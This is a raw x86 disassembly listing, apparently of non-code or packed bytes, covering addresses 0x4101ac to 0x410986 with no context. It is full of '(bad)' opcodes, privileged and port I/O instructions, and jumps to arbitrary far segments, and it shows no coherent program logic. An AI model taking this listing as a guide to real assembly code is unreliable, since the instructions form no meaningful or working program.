  4101ac:	mov    edx,0x82c57ccb
  4101b1:	jmp    0xaf06:0xefdde3b8
  4101b8:	mov    edx,0x2542db48
  4101bd:	mov    edi,0x91c6bd11
  4101c2:	dec    ebp
  4101c3:	js     0x41018f
  4101c5:	lahf   
  4101c6:	xchg   ecx,eax
  4101c7:	scas   eax,DWORD PTR es:[edi]
  4101c8:	dec    ebx
  4101c9:	cmp    BYTE PTR [ebx+0x2c8bb31],0xff
  4101d0:	daa    
  4101d1:	push   ss
  4101d2:	mov    ebx,0xa65cc434
  4101d7:	les    edx,FWORD PTR [ebp+0x1c]
  4101da:	retf   
  4101db:	retf   
  4101dc:	cmp    BYTE PTR [ecx-0x1949bfbb],al
  4101e2:	sub    BYTE PTR ds:[ecx-0x7a],0x54
  4101e7:	jne    0x410258
  4101e9:	leave  
  4101ea:	push   es
  4101eb:	repz sub ecx,DWORD PTR [eax-0x67]
  4101ef:	mov    ds:0x54197c7f,al
  4101f4:	add    al,0xde
  4101f6:	inc    ebp
  4101f7:	cmp    DWORD PTR [eax],0x1e75f8e9
  4101fd:	ret    
  4101fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ff:	push   ebx
  410200:	mov    al,ds:0x9d71edf7
  410205:	in     al,0x48
  410207:	sbb    eax,0xda8b6342
  41020c:	fild   DWORD PTR [edi-0x75]
  41020f:	mov    edx,0xa68aa77a
  410214:	dec    esp
  410215:	or     eax,0xffffffb8
  410218:	adc    BYTE PTR [eax+ebp*2],bl
  41021b:	scas   al,BYTE PTR es:[edi]
  41021c:	push   eax
  41021d:	and    BYTE PTR [edx],dh
  41021f:	mov    WORD PTR [ebp-0x27a9e728],cs
  410225:	dec    ecx
  410226:	sbb    al,ch
  410228:	test   al,0x3d
  41022a:	outs   dx,DWORD PTR ds:[esi]
  41022b:	popa   
  41022c:	test   bh,bl
  41022e:	fnstsw WORD PTR [ecx+0x4148e5d3]
  410234:	xchg   ebx,eax
  410235:	jo     0x41024c
  410237:	loopne 0x410223
  410239:	push   esi
  41023a:	into   
  41023b:	jne    0x41021f
  41023d:	rol    DWORD PTR [edi+0x1f],cl
  410240:	pusha  
  410241:	out    dx,al
  410242:	ficomp WORD PTR [ecx-0x2c66a016]
  410248:	adc    al,0x89
  41024a:	sbb    edi,DWORD PTR [ecx+0x4d]
  41024d:	std    
  41024e:	setb   BYTE PTR [eax]
  410251:	sbb    eax,0x9f30179
  410256:	popw   es
  410258:	mov    cl,0xa7
  41025a:	out    0x37,al
  41025c:	aas    
  41025d:	cmp    al,0xff
  41025f:	rol    DWORD PTR [edi-0x22],cl
  410262:	adc    ebx,DWORD PTR [esi+0x3d]
  410265:	dec    ebp
  410266:	push   es
  410267:	pop    es
  410268:	stos   DWORD PTR es:[edi],eax
  410269:	mov    esi,0x969d3f76
  41026e:	and    DWORD PTR [esi+0x4c],esp
  410271:	dec    ebx
  410272:	jns    0x4102ea
  410274:	mov    dl,0xb6
  410276:	xor    edx,ebx
  410278:	add    ch,ah
  41027a:	xor    edx,DWORD PTR [eax+ebp*2+0x19]
  41027e:	pusha  
  41027f:	pop    esp
  410280:	inc    ecx
  410281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410282:	aam    0x57
  410284:	jae    0x41022b
  410286:	stc    
  410287:	in     al,0xd8
  410289:	not    edi
  41028b:	(bad)  
  41028c:	out    dx,al
  41028d:	rcl    DWORD PTR [edi-0x44],0x63
  410291:	jne    0x4102c1
  410293:	out    0x37,al
  410295:	test   DWORD PTR [ebx+0x191aca86],ecx
  41029b:	es cwde 
  41029d:	xchg   esp,eax
  41029e:	fild   WORD PTR [edx-0x6a]
  4102a1:	iret   
  4102a2:	xor    al,0x11
  4102a4:	pop    DWORD PTR [ecx-0x11bc679b]
  4102aa:	mov    gs,WORD PTR [esi-0x16]
  4102ad:	mov    bh,ah
  4102af:	(bad)  
  4102b0:	(bad)  
  4102b1:	cmp    DWORD PTR ds:0x135d8112,ecx
  4102b7:	inc    edi
  4102b8:	sub    esp,edx
  4102ba:	ins    BYTE PTR es:[edi],dx
  4102bb:	mov    cl,0xe1
  4102bd:	popa   
  4102be:	data16 (bad) 
  4102c0:	rcr    bl,1
  4102c2:	fdivr  st(5),st
  4102c4:	dec    ecx
  4102c5:	test   DWORD PTR [ebp+0x6e],esp
  4102c8:	mov    al,ds:0xc97a241e
  4102cd:	je     0x41031f
  4102cf:	cmc    
  4102d0:	sub    DWORD PTR [eax-0x7a],esp
  4102d3:	cmp    eax,0x5179b2ad
  4102d8:	mov    ch,0x52
  4102da:	fdiv   DWORD PTR [ebx]
  4102dc:	jnp    0x4102e7
  4102de:	cmp    al,0xd
  4102e0:	jg     0x410273
  4102e2:	das    
  4102e3:	xchg   esp,eax
  4102e4:	xchg   esp,eax
  4102e5:	push   DWORD PTR ds:0x755cb024
  4102eb:	push   es
  4102ec:	sub    al,0x4d
  4102ee:	sbb    DWORD PTR [edi],eax
  4102f0:	mov    edx,0x91a716ce
  4102f5:	push   edi
  4102f6:	lods   eax,DWORD PTR ds:[esi]
  4102f7:	mov    eax,ds:0x9a2de8bd
  4102fc:	and    BYTE PTR [eax+0x3],bl
  4102ff:	outs   dx,BYTE PTR ds:[esi]
  410300:	test   DWORD PTR [edi+eiz*1+0x5c],ebx
  410304:	in     al,dx
  410305:	inc    edx
  410306:	int3   
  410307:	lock fisub WORD PTR [eax+eiz*1+0x1bc70bdc]
  41030f:	sbb    BYTE PTR [edi-0x2f23c228],0x85
  410316:	inc    eax
  410317:	mov    ecx,0xad2001fc
  41031c:	dec    ecx
  41031d:	or     edi,esi
  41031f:	inc    ecx
  410320:	sbb    dl,al
  410322:	nop
  410323:	lahf   
  410324:	ret    0x36d8
  410327:	pusha  
  410328:	sbb    eax,0xaefb8421
  41032d:	jge    0x41035d
  41032f:	mov    esp,0x65ed98da
  410334:	es out dx,eax
  410336:	and    esi,DWORD PTR [eax+0x3]
  410339:	push   ebx
  41033a:	add    DWORD PTR [eax],0x78
  41033d:	fidiv  DWORD PTR [edi+0x432871db]
  410343:	(bad)  
  410344:	iret   
  410345:	or     DWORD PTR [ebx-0x4],0x73
  410349:	mov    bh,0xe0
  41034b:	jne    0x41031d
  41034d:	into   
  41034e:	cwde   
  41034f:	jmp    FWORD PTR [edx]
  410351:	jl     0x41035b
  410353:	mov    esp,0x32312cd6
  410358:	stc    
  410359:	pop    ecx
  41035a:	sbb    BYTE PTR [edi-0x3f313d61],bl
  410360:	rdmsr  
  410362:	and    al,0x6a
  410364:	fs scas eax,DWORD PTR es:[edi]
  410366:	pusha  
  410367:	jnp    0x410362
  410369:	jae    0x410354
  41036b:	mov    al,bl
  41036d:	sbb    al,0x25
  41036f:	lds    ecx,FWORD PTR [edx+0x32508608]
  410375:	xchg   esi,eax
  410376:	das    
  410377:	pop    esp
  410378:	adc    bl,ah
  41037a:	xchg   esi,eax
  41037b:	adc    al,0x8c
  41037d:	jp     0x4103f6
  41037f:	enter  0x39f6,0x64
  410383:	sub    DWORD PTR [eax-0x60],ecx
  410386:	and    DWORD PTR [edx],0xe27f9baa
  41038c:	dec    edx
  41038d:	mov    dl,0xbd
  41038f:	pop    ebp
  410390:	mov    dh,0x76
  410392:	lds    ecx,FWORD PTR [edx]
  410394:	int3   
  410395:	loopne 0x410367
  410397:	(bad)  
  410398:	stos   BYTE PTR es:[edi],al
  410399:	out    0x5f,al
  41039b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41039c:	mov    al,0x7f
  41039e:	(bad)  
  41039f:	jno    0x4103e8
  4103a1:	inc    esi
  4103a2:	sti    
  4103a3:	sbb    DWORD PTR [ebx+0x52befbc3],0x2a
  4103aa:	call   0x6750:0xf089b193
  4103b1:	jp     0x41036e
  4103b3:	mov    ecx,0x7250b56b
  4103b8:	into   
  4103b9:	inc    esi
  4103ba:	scas   eax,DWORD PTR es:[edi]
  4103bb:	jmp    0x771263a9
  4103c0:	pop    ebx
  4103c1:	xchg   ebp,eax
  4103c2:	bound  esp,QWORD PTR [esi]
  4103c4:	mov    cl,0x47
  4103c6:	mul    BYTE PTR [eax-0x5]
  4103c9:	int3   
  4103ca:	loope  0x410387
  4103cc:	int    0x28
  4103ce:	jns    0x4103b0
  4103d0:	jmp    DWORD PTR [ebx+0x274846c5]
  4103d6:	xor    eax,0xee7ed6f
  4103db:	scas   al,BYTE PTR es:[edi]
  4103dc:	js     0x4103f5
  4103de:	adc    DWORD PTR [esp+esi*2-0x47],ecx
  4103e2:	mov    al,ds:0x147e9fde
  4103e7:	stos   BYTE PTR es:[edi],al
  4103e8:	cmp    DWORD PTR [ebp-0x30],ebp
  4103eb:	out    dx,eax
  4103ec:	ficom  WORD PTR [edx+0x5c]
  4103ef:	sbb    eax,0xdd83ddc0
  4103f4:	xor    bh,BYTE PTR [ebp+0x6d919f96]
  4103fa:	call   0xfe1d5931
  4103ff:	gs push eax
  410401:	adc    BYTE PTR [eax+eiz*8-0x2f9ae938],dl
  410408:	mov    DWORD PTR [ecx],edi
  41040a:	jae    0x410439
  41040c:	jle    0x4103d0
  41040e:	not    DWORD PTR [edx-0x4c]
  410411:	(bad)  
  410412:	push   ebp
  410413:	dec    ecx
  410414:	inc    ebx
  410415:	or     eax,0xbbfa98b5
  41041a:	add    esp,DWORD PTR [ebx]
  41041c:	stos   BYTE PTR es:[edi],al
  41041d:	adc    al,0xb5
  41041f:	pop    ecx
  410420:	es jle 0x410423
  410423:	adc    BYTE PTR [ecx+0x509a7777],dh
  410429:	jl     0x4103d1
  41042b:	int3   
  41042c:	and    bh,BYTE PTR [ecx-0x71]
  41042f:	lods   eax,DWORD PTR ds:[esi]
  410430:	push   edx
  410431:	add    BYTE PTR [ebp+0x335127dd],al
  410437:	mov    DWORD PTR [edx],edi
  410439:	xor    bh,BYTE PTR [ecx-0x58]
  41043c:	rcl    BYTE PTR [ebp+eiz*2-0x4105e9b6],0xbe
  410444:	call   0xbcc:0xfbafe1a1
  41044b:	sub    al,0x21
  41044d:	fwait
  41044e:	and    BYTE PTR [ecx],bl
  410450:	jmp    0x4104a0
  410452:	push   ecx
  410453:	xchg   esp,eax
  410454:	test   BYTE PTR [ecx],0x5a
  410457:	loopne 0x4103f4
  410459:	add    eax,0x445586f8
  41045e:	xchg   BYTE PTR [esp+ebx*8+0x29],ah
  410462:	sar    BYTE PTR [ecx-0x2f],1
  410465:	loopne 0x410472
  410467:	sbb    ecx,DWORD PTR [ebp-0x64]
  41046a:	popa   
  41046b:	lahf   
  41046c:	pop    es
  41046d:	dec    ebx
  41046e:	fs pop esp
  410470:	loope  0x410443
  410472:	scas   al,BYTE PTR es:[edi]
  410473:	push   es
  410474:	and    al,0x47
  410476:	pop    ecx
  410477:	jge    0x410418
  410479:	sbb    DWORD PTR [ecx+ecx*2+0x5a],0x74
  41047e:	out    dx,al
  41047f:	inc    edx
  410480:	ins    DWORD PTR es:[edi],dx
  410481:	clc    
  410482:	mov    DWORD PTR ds:0xce338b69,eax
  410488:	or     ah,BYTE PTR [esi+0x79]
  41048b:	dec    ebp
  41048c:	sub    BYTE PTR [ebx+0x46],0xe9
  410490:	out    dx,eax
  410491:	xchg   DWORD PTR [eax],edi
  410493:	sub    eax,0xd271462f
  410498:	mov    al,ds:0x9acb486e
  41049d:	repz sbb cl,BYTE PTR gs:[ecx]
  4104a1:	aam    0x8a
  4104a3:	push   0xffffffb5
  4104a5:	push   eax
  4104a6:	push   eax
  4104a7:	stos   DWORD PTR es:[edi],eax
  4104a8:	jle    0x410447
  4104aa:	push   edx
  4104ab:	aam    0x70
  4104ad:	shr    DWORD PTR [eax+0x75],cl
  4104b0:	test   eax,0x65821a52
  4104b5:	sbb    al,bl
  4104b7:	push   eax
  4104b8:	call   0x4b27:0x2affbd41
  4104bf:	test   al,0xb2
  4104c1:	aaa    
  4104c2:	sub    bl,ah
  4104c4:	pop    ds
  4104c5:	xor    eax,0xf58f96dd
  4104ca:	cmc    
  4104cb:	jnp    0x410519
  4104cd:	jne    0x410492
  4104cf:	mov    edx,0xb34cbcb5
  4104d4:	jae    0x410514
  4104d6:	pop    ds
  4104d7:	rcl    BYTE PTR [ebp+0x4e],cl
  4104da:	test   al,0x12
  4104dc:	jecxz  0x4104f3
  4104de:	fistp  WORD PTR [edx+0x64]
  4104e1:	shl    DWORD PTR [eax+0x58c3b40c],cl
  4104e7:	out    dx,al
  4104e8:	jp     0x410520
  4104ea:	push   ecx
  4104eb:	and    ecx,DWORD PTR [ecx]
  4104ed:	imul   dh
  4104ef:	dec    edx
  4104f0:	mov    ebx,0x7e1c4a4f
  4104f5:	fwait
  4104f6:	xchg   esp,eax
  4104f7:	or     BYTE PTR [ebx-0x6ede1bc3],al
  4104fd:	sbb    al,0x59
  4104ff:	cmp    eax,0x466b6fc1
  410504:	in     eax,0xeb
  410506:	fisubr DWORD PTR [esi+0x77cb3c2e]
  41050c:	ret    
  41050d:	add    al,BYTE PTR [ebx-0xd8acb3a]
  410513:	ins    DWORD PTR es:[edi],dx
  410514:	mov    BYTE PTR [ebx+ebx*2+0x3b2742c9],ch
  41051b:	pop    ss
  41051c:	int3   
  41051d:	dec    esp
  41051e:	mov    eax,ds:0x5757f794
  410523:	lds    eax,FWORD PTR [bx+di-0x77]
  410527:	mov    dl,0xdd
  410529:	retf   
  41052a:	fild   QWORD PTR [esi]
  41052c:	ror    DWORD PTR [ecx],1
  41052e:	and    DWORD PTR [edx+0x7d],ebp
  410531:	or     BYTE PTR [ebx-0x7d9d7c28],al
  410537:	sbb    al,0x20
  410539:	mov    al,0x0
  41053b:	sbb    esi,DWORD PTR [esi+0x5022981]
  410541:	sub    eax,0x2aafd9c
  410546:	rcl    DWORD PTR [esi+0x2db21b8d],0xf
  41054d:	aaa    
  41054e:	and    eax,0x544e5207
  410553:	pushf  
  410554:	mov    WORD PTR [edx+edi*2+0x19],ss
  410558:	pop    ds
  410559:	retf   
  41055a:	loop   0x41051a
  41055c:	xchg   BYTE PTR [edi+0x128a9d9c],ch
  410562:	jb     0x410571
  410564:	xchg   edx,eax
  410565:	sub    edi,esp
  410567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410568:	cmp    DWORD PTR [esi-0x66],0xffffff88
  41056c:	jb     0x4104fc
  41056e:	add    eax,0x814acfef
  410573:	in     al,dx
  410574:	ret    
  410575:	xchg   ecx,eax
  410576:	out    0xfb,eax
  410578:	cmp    cl,BYTE PTR [edx]
  41057a:	mov    ds:0xdb7abfac,al
  41057f:	mov    esp,0x8cf83543
  410584:	aaa    
  410585:	or     BYTE PTR [edi],ah
  410587:	jae    0x4105ce
  410589:	or     ah,BYTE PTR [edi+0x57da8f42]
  41058f:	cmc    
  410590:	push   edi
  410591:	repz push esp
  410593:	bound  ecx,QWORD PTR [ebx]
  410595:	fnsave [ebx]
  410597:	test   bh,cl
  410599:	rol    esi,0x44
  41059c:	leave  
  41059d:	retf   0x3de8
  4105a0:	loopne 0x41056e
  4105a2:	sub    DWORD PTR [edi+ecx*8+0x26bc001f],edx
  4105a9:	ss ss jbe 0x4105d0
  4105ad:	imul   eax,DWORD PTR [ecx],0xffffffff
  4105b0:	xor    BYTE PTR [edi],0xf4
  4105b3:	jae    0x4105d6
  4105b5:	jmp    0x2c7354fd
  4105ba:	or     eax,0x5b0038ef
  4105bf:	in     al,dx
  4105c0:	xchg   BYTE PTR ds:0xb19e13d2,cl
  4105c6:	loopne 0x410568
  4105c8:	push   ss
  4105c9:	sbb    DWORD PTR [edx+0x5f6df02],edx
  4105cf:	pushf  
  4105d0:	dec    ecx
  4105d1:	sbb    ebx,edx
  4105d3:	or     DWORD PTR [esi+ebp*4],edx
  4105d6:	xlat   BYTE PTR ds:[ebx]
  4105d7:	dec    esi
  4105d8:	push   DWORD PTR [edi]
  4105da:	mov    ah,0x0
  4105dc:	sahf   
  4105dd:	add    al,0x17
  4105df:	div    BYTE PTR [eax+0x1b]
  4105e2:	jmp    0x32b33de5
  4105e7:	aaa    
  4105e8:	push   ecx
  4105e9:	lods   al,BYTE PTR ds:[esi]
  4105ea:	sar    ebx,1
  4105ec:	test   DWORD PTR [ebp+0x3d65f199],edx
  4105f2:	pop    edi
  4105f3:	add    al,0x14
  4105f5:	push   ds
  4105f6:	pop    ecx
  4105f8:	and    BYTE PTR [edx+0x211e7093],dl
  4105fe:	push   edi
  4105ff:	test   BYTE PTR [ebp-0x3c0fb40d],ch
  410605:	mov    ch,cl
  410607:	loopne 0x410631
  410609:	add    al,0xf5
  41060b:	jle    0x410678
  41060d:	in     al,dx
  41060e:	cdq    
  41060f:	(bad)  
  410610:	or     al,0xdf
  410612:	stos   BYTE PTR es:[edi],al
  410613:	cmp    BYTE PTR [ebx-0x70],bh
  410616:	arpl   WORD PTR [edi-0x7121fec7],dx
  41061c:	cmp    ebx,DWORD PTR [eax+0xe7b0bce]
  410622:	xlat   BYTE PTR ds:[ebx]
  410623:	xlat   BYTE PTR ds:[ebx]
  410624:	scas   al,BYTE PTR es:[edi]
  410625:	mov    dh,BYTE PTR [ecx+edx*2-0x406bd714]
  41062c:	lods   eax,DWORD PTR ds:[esi]
  41062d:	ss pop ss
  41062f:	es sti 
  410631:	pop    eax
  410632:	sbb    edx,edx
  410634:	xor    BYTE PTR [eax-0x1baff1fe],dl
  41063a:	sbb    DWORD PTR [ebx-0xa],0xdd7d1dcd
  410641:	popf   
  410642:	adc    ah,0xa6
  410645:	test   al,0xe9
  410647:	test   al,0x5e
  410649:	inc    esi
  41064a:	mov    esi,0xe665530b
  41064f:	mov    ds:0x5c064e5b,al
  410654:	mov    al,ds:0xe139e736
  410659:	inc    ebp
  41065a:	dec    edx
  41065b:	inc    ebx
  41065c:	fidivr DWORD PTR [ebp+0x550716e3]
  410662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410663:	jp     0x410649
  410665:	loopne 0x4106b7
  410667:	sbb    DWORD PTR [ebp-0x20b310f7],0xba0706bb
  410671:	rep ins DWORD PTR es:[edi],dx
  410673:	jae    0x4106e7
  410675:	ds sahf 
  410677:	push   cs
  410678:	dec    esp
  410679:	push   ds
  41067a:	cmp    al,0x42
  41067c:	cli    
  41067d:	or     eax,0x5f6d8947
  410682:	sbb    BYTE PTR [ecx-0x3f],cl
  410685:	adc    eax,0xec449d5f
  41068a:	inc    eax
  41068b:	clc    
  41068c:	mov    esp,0xff06dcc9
  410691:	sub    esi,DWORD PTR [ebx-0x1]
  410694:	call   0x5ead:0x6faaa9cf
  41069b:	cmc    
  41069c:	sub    BYTE PTR [ebx],bh
  41069e:	addr16 inc edi
  4106a0:	pushf  
  4106a1:	push   eax
  4106a2:	test   BYTE PTR [ebp-0x38f6c1cc],0xef
  4106a9:	loop   0x410717
  4106ab:	xlat   BYTE PTR ds:[ebx]
  4106ac:	mov    al,0x6a
  4106ae:	mov    edx,0x30a44bc4
  4106b3:	cli    
  4106b4:	inc    ecx
  4106b5:	push   esp
  4106b6:	push   ebx
  4106b7:	pop    edx
  4106b8:	xchg   ebp,eax
  4106b9:	xchg   ecx,eax
  4106ba:	dec    eax
  4106bb:	push   0x3c
  4106bd:	lds    esp,FWORD PTR ds:0xc692fa77
  4106c3:	jmp    0x77b0a521
  4106c8:	push   0x820a6677
  4106cd:	(bad)  
  4106ce:	mov    esi,0xeb72362e
  4106d3:	int3   
  4106d4:	jmp    0xeb59:0xd585c30d
  4106db:	jmp    DWORD PTR [edx+eiz*4]
  4106de:	cmp    edx,DWORD PTR [edi-0x6c]
  4106e1:	popf   
  4106e2:	mov    edx,0x91ecc0d0
  4106e7:	or     ch,BYTE PTR [edi]
  4106e9:	outs   dx,DWORD PTR ds:[esi]
  4106ea:	loop   0x410746
  4106ec:	jmp    0xac13:0xe48f1b11
  4106f3:	daa    
  4106f4:	xchg   edx,eax
  4106f5:	popf   
  4106f6:	pusha  
  4106f7:	data16 cli 
  4106f9:	mov    ch,BYTE PTR [eax+edi*1+0x6f]
  4106fd:	stc    
  4106fe:	fmul   QWORD PTR [ebp-0x11]
  410701:	test   eax,0x51d66e82
  410706:	mov    ds:0x193556fe,al
  41070b:	mov    esp,0xc6d82d09
  410710:	das    
  410711:	mov    ecx,0x3d013e66
  410716:	in     al,dx
  410717:	test   BYTE PTR ds:0x4a39d279,al
  41071d:	fs jb  0x4106bc
  410720:	lods   al,BYTE PTR ds:[esi]
  410721:	pop    es
  410722:	pop    ds
  410723:	repz push esp
  410725:	loope  0x4106c8
  410727:	outs   dx,DWORD PTR ds:[esi]
  410728:	fbld   TBYTE PTR [ebp+0x33]
  41072b:	xchg   DWORD PTR [esi],ebx
  41072d:	mov    ds,WORD PTR [edx+0x2a]
  410730:	sub    ebx,DWORD PTR [ebx-0x6e]
  410733:	int    0xca
  410735:	outs   dx,DWORD PTR ds:[esi]
  410736:	(bad)  
  410737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410738:	mov    edi,0x1aaf936e
  41073d:	dec    eax
  41073e:	imul   eax,edx,0xb37d1886
  410744:	jns    0x4106f2
  410746:	push   ebp
  410747:	push   0x3456fc6b
  41074c:	adc    al,0x6
  41074e:	dec    BYTE PTR [eax]
  410750:	fist   WORD PTR [ebx]
  410752:	cwde   
  410753:	pop    ebp
  410754:	inc    edx
  410755:	dec    eax
  410756:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410758:	add    esp,0x54
  41075b:	cdq    
  41075c:	add    al,0xd
  41075e:	pop    ebx
  41075f:	cmp    al,BYTE PTR [ecx+eax*8-0x6e]
  410763:	stos   BYTE PTR es:[edi],al
  410764:	or     al,0x63
  410766:	or     BYTE PTR ds:0x408ab80a,bl
  41076c:	sub    al,0x74
  41076e:	jmp    0xdceb:0x31f6743f
  410775:	outs   dx,DWORD PTR ds:[esi]
  410776:	sahf   
  410777:	cmp    cl,BYTE PTR [ebx-0x11]
  41077a:	test   DWORD PTR [ebx+ecx*4-0x5b],esp
  41077e:	cs icebp 
  410780:	mov    dh,0xbf
  410782:	retf   0x3372
  410785:	icebp  
  410786:	dec    ebx
  410787:	sub    ah,BYTE PTR [eax-0x963432b]
  41078d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41078e:	pop    eax
  41078f:	hlt    
  410790:	nop
  410791:	fisub  DWORD PTR [edi-0x70]
  410794:	jno    0x410815
  410796:	lds    edx,FWORD PTR [edx-0x6e8693cf]
  41079c:	sar    BYTE PTR [ebp+0x21c655ad],cl
  4107a2:	adc    DWORD PTR [edx-0x63],ebp
  4107a5:	mov    edi,cs
  4107a7:	push   edi
  4107a8:	stc    
  4107a9:	mov    bl,0x9d
  4107ab:	and    edi,DWORD PTR [edi-0x36]
  4107ae:	sbb    al,bl
  4107b0:	pushf  
  4107b1:	imul   ecx,DWORD PTR [edx],0x4a
  4107b4:	loope  0x41077f
  4107b6:	or     BYTE PTR [edi-0x456ca007],ch
  4107bc:	pop    edi
  4107bd:	pop    ds
  4107be:	jge    0x41078a
  4107c0:	(bad)  
  4107c1:	daa    
  4107c2:	out    dx,eax
  4107c3:	scas   eax,DWORD PTR es:[edi]
  4107c4:	scas   eax,DWORD PTR es:[edi]
  4107c5:	iret   
  4107c6:	(bad)  
  4107c7:	fistp  DWORD PTR [edi]
  4107c9:	test   al,0x74
  4107cb:	cwde   
  4107cc:	mov    WORD PTR [esi-0x697ef1e9],es
  4107d2:	pop    es
  4107d3:	mov    esi,0x3176c1b
  4107d8:	and    al,0xa8
  4107da:	imul   ecx,DWORD PTR [ebx-0x57],0xcc744e16
  4107e1:	inc    edx
  4107e2:	jnp    0x410812
  4107e4:	mov    bh,0x79
  4107e6:	pop    ecx
  4107e7:	out    dx,eax
  4107e8:	mov    edx,DWORD PTR [ecx]
  4107ea:	mov    ss,ecx
  4107ec:	lahf   
  4107ed:	dec    esi
  4107ee:	and    al,0x6b
  4107f0:	or     DWORD PTR [esi-0x65d1e046],edi
  4107f6:	jmp    0xaec749d3
  4107fb:	dec    edi
  4107fc:	cmp    BYTE PTR [esp+edi*1],bl
  4107ff:	(bad)  
  410800:	outs   dx,BYTE PTR ds:[esi]
  410801:	xor    DWORD PTR [esi-0x1cb20f4a],0x209ed3ae
  41080b:	xor    ebp,DWORD PTR [ecx]
  41080d:	scas   al,BYTE PTR es:[edi]
  41080e:	push   ds
  41080f:	mov    dh,0x1
  410811:	jp     0x4107e6
  410813:	enter  0x47f5,0xa9
  410817:	inc    edi
  410818:	jl     0x4107bd
  41081a:	mov    esi,0x3f7d5ab9
  41081f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410820:	cmp    edx,DWORD PTR [edx+0x405fbf62]
  410826:	dec    eax
  410827:	xlat   BYTE PTR ds:[ebx]
  410828:	adc    dl,bh
  41082a:	dec    esi
  41082b:	aam    0x25
  41082d:	mov    al,0x99
  41082f:	in     al,0xb0
  410831:	mov    ss,WORD PTR [eax+0x47717593]
  410837:	and    al,0x96
  410839:	je     0x410857
  41083b:	push   0xdb5afc6a
  410840:	loop   0x4107d8
  410842:	in     al,0xd3
  410844:	jle    0x410836
  410846:	xor    al,0x44
  410848:	pushf  
  410849:	or     BYTE PTR [edi+0xc99e8cb],ch
  41084f:	sbb    DWORD PTR [eax+0x12],eax
  410852:	out    dx,al
  410853:	push   0xa6776a59
  410858:	scas   eax,DWORD PTR es:[edi]
  410859:	repz cli 
  41085b:	lds    esp,FWORD PTR [edi]
  41085d:	repnz cmp ebp,ebx
  410860:	xor    edx,esi
  410862:	pop    ecx
  410863:	into   
  410864:	dec    ebx
  410865:	mov    ebx,0x4e951216
  41086a:	or     bl,cl
  41086c:	lahf   
  41086d:	call   0xc88de8a
  410872:	loop   0x410820
  410874:	cwde   
  410875:	cmp    al,0x6c
  410877:	mov    dh,0xb1
  410879:	pop    esi
  41087a:	jg     0x4108a3
  41087c:	pop    eax
  41087d:	jno    0x4108d5
  41087f:	sahf   
  410880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410881:	mov    ecx,0x9f4cc20e
  410886:	in     eax,0x6e
  410888:	mov    al,ds:0x31a03698
  41088d:	mov    ebx,0xd02d9fbc
  410892:	cdq    
  410893:	sar    DWORD PTR [esi],0xb
  410896:	xchg   edi,eax
  410897:	fwait
  410898:	loop   0x410837
  41089a:	ja     0x41087d
  41089c:	(bad)  
  41089d:	shl    BYTE PTR [ebx-0x618bb66b],0x1f
  4108a4:	push   esp
  4108a5:	or     bl,BYTE PTR [eax+edx*2+0x477471c6]
  4108ac:	adc    DWORD PTR [ecx+0x153a76c2],esi
  4108b2:	sbb    eax,0x5d8c1042
  4108b7:	jb     0x41087e
  4108b9:	ret    
  4108ba:	dec    esi
  4108bb:	inc    eax
  4108bc:	pop    edi
  4108bd:	or     eax,0xd4ea660c
  4108c2:	dec    edx
  4108c3:	fwait
  4108c4:	add    dl,dh
  4108c6:	mov    al,ds:0xaccdccfd
  4108cb:	iret   
  4108cc:	adc    eax,0x47eeaa28
  4108d1:	out    0x21,eax
  4108d3:	mov    edi,0x5533a805
  4108d8:	inc    ebx
  4108d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108da:	jno    0x41092c
  4108dc:	ins    DWORD PTR es:[edi],dx
  4108dd:	imul   edx,DWORD PTR [ecx+ecx*8],0x74dee9f
  4108e4:	jnp    0x410896
  4108e6:	std    
  4108e7:	call   0x4275:0x41539de0
  4108ee:	fucom  st(7)
  4108f0:	and    BYTE PTR [edi+0x42741522],al
  4108f6:	push   esp
  4108f7:	inc    edx
  4108f8:	sti    
  4108f9:	(bad)  
  4108fa:	call   0x922a5cb8
  4108ff:	xchg   edx,eax
  410900:	jle    0x41091d
  410902:	and    ebx,DWORD PTR [ebx]
  410904:	cmp    al,0xac
  410906:	mov    esi,0xfa10c83
  41090b:	mov    eax,ds:0xeda65766
  410910:	inc    eax
  410911:	xor    eax,0x68ca55fb
  410916:	fs cmp edi,ebp
  410919:	add    DWORD PTR [esi+0x4b],0x6bee7c41
  410920:	pop    es
  410921:	in     al,dx
  410922:	dec    ebx
  410923:	std    
  410924:	popa   
  410925:	sbb    al,0xf7
  410927:	enter  0x2246,0x1a
  41092b:	push   ebx
  41092c:	cmp    al,0x92
  41092e:	(bad)  
  41092f:	out    dx,eax
  410930:	js     0x41096f
  410932:	cwde   
  410933:	mov    cl,0xa8
  410935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410936:	aad    0x93
  410938:	cdq    
  410939:	and    eax,DWORD PTR [esi+0xb]
  41093c:	mov    esp,0xc011a9e6
  410941:	cwde   
  410942:	icebp  
  410943:	popa   
  410944:	outs   dx,DWORD PTR ds:[esi]
  410945:	adc    BYTE PTR [esp+esi*4-0x32efa8f0],ch
  41094c:	xor    bh,BYTE PTR [eax+0x6d]
  41094f:	ficomp DWORD PTR [ebp-0x37]
  410952:	gs adc dh,ch
  410955:	mov    ah,0xef
  410957:	imul   eax,eax,0xffffffea
  41095a:	(bad)  
  41095c:	xchg   DWORD PTR [edx+0x11],edx
  41095f:	cmp    edx,DWORD PTR [ebx]
  410961:	pop    esp
  410962:	gs dec esp
  410964:	dec    ebp
  410965:	stos   BYTE PTR es:[edi],al
  410966:	(bad)  
  410967:	and    edi,edi
  410969:	or     DWORD PTR [ecx+0x636c6299],edi
  41096f:	rcr    BYTE PTR ds:0xa2a109b0,1
  410975:	loop   0x4109c0
  410977:	out    0x9b,al
  410979:	outs   dx,WORD PTR ds:[esi]
  41097b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41097c:	mov    ah,0x7f
  41097e:	imul   edi,ebx,0x7fc3392e
  410984:	daa    
  410985:	ins    DWORD PTR es:[edi],dx
  410986:	pop    eax
